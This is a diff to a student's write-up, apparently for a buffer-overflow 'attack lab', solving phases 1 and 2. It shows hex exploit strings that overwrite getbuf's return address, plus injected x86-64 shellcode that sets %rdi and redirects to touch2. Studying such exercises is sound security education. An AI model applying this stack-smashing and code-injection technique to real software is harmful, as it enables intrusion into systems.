@@ -6,6 +6,62 @@ The stack space of ~getbuf~ is ~0x28~. The address of ~touch1~ is
 ~0x4017c0~. Thus, the exploit string should consists of 40 bytes of
 random garbage and a 8-byte wide ~0x4017c0~.
 
+The string that used by =hex2raw= to generate the actual input string:
+
 #+begin_example
-c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 
+c0 17 40 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+#+end_example
+
+* Phase 2
+
+In phase 2 we are going to inject the following code into the
+program.
+
+#+begin_src asm
+          mov $0x59b997fa, %rdi
+          mov $0x4017ec, (%rsp)
+          ret
+#+end_src
+
+To be more specific, the code is injected to the buffer of the ~getbuf~
+function. We also have to make ~getbuf~ returns to the starting address
+of the buffer, which is =0x5561dc78=.
+
+The final string we feed to =hex2raw= is:
+
+#+begin_example
+48 c7 c7 fa 97 b9 59 48 c7 04 24 ec 17 40 00 c3
+78 dc 61 55 00 00 00 00
+78 dc 61 55 00 00 00 00
+78 dc 61 55 00 00 00 00
+78 dc 61 55 00 00 00 00
+#+end_example
+
+Though this piece of code successfully called ~touch2~, it also
+generates a segmentation fault. I think it is because we overwrite the
+value where ~%rsp~ is pointing to. Instead of move, let's try ~push~. The
+new injected code is:
+
+#+begin_src asm
+          mov $0x59b997fa, %rdi
+          push $0x4017ec
+          ret
+#+end_src
+
+The corresponding string that we feed to =hex2raw= is:
+
+#+begin_example
+48 c7 c7 fa 97 b9 59
+68 ec 17 40 00
+c3
+00 00 00
+78 dc 61 55 00 00 00 00
+78 dc 61 55 00 00 00 00
+78 dc 61 55 00 00 00 00
+78 dc 61 55 00 00 00 00
 #+end_example
